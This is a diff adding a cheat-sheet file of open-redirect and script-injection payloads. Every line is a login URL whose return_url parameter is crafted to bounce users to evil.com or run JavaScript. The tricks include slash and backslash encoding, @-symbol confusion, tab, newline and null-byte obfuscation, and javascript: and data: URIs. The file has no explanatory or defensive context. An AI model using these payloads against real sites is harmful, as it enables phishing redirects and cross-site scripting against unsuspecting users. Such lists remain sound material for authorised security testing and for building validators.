@@ -1,0 +1,39 @@
+⚠️ Common Open Redirect Use Cases:
+==================================
+
+1.Double Slash Technique (//)
+https://example.com/account/login?return_url=https://evil.com
+https://example.com/account/login?return_url=//evil.com
+https://example.com/account/login?return_url=///evil.com
+https://example.com/account/login?return_url=https://evil.com%23@example.com
+
+2.JavaScript Protocol Injection
+https://example.com/account/login?return_url=javascript:alert(1)
+
+2. @ Symbol Exploit
+https://example.com/account/login?return_url=https://example.com@evil.com
+https://example.com/account/login?return_url=https://evil.com@example.com
+
+3. Encoded Bypass with %2F and %5C (Slash/Backslash)
+https://example.com/account/login?return_url=%5C%5Cevil.com
+https://example.com/account/login?return_url=https:%2f%2fevil.com
+
+4. Data URI Injection
+https://example.com/account/login?return_url=data:text/html,<script>alert('XSS')</script>
+
+5. Open Redirect via Path Injection
+https://example.com/account/login?return_url=/\evil.com
+https://example.com/account/login?return_url=/\@evil.com
+https://example.com/account/login?return_url=/evil.com/%2e%2e
+https://example.com/account/login?return_url=..%2f..%2fevil.com
+
+3.Bypass with Special Characters
+https://example.com/account/login?return_url=/account)%3Balert(1)//
+https://example.com/account/login?return_url=/account/)%7D;alert(`XSS`)
+https://example.com/account/login?return_url=javascript:alert(`XSS`);
+https://example.com/account/login?return_url=javascript:eval(`alert(1)`)
+
+6. Obfuscation Tricks (Bypass Filters)
+https://example.com/account/login?return_url=https:%09//evil.com
+https://example.com/account/login?return_url=https:%0a//evil.com
+https://example.com/account/login?return_url=https://evil.com%00.example.com
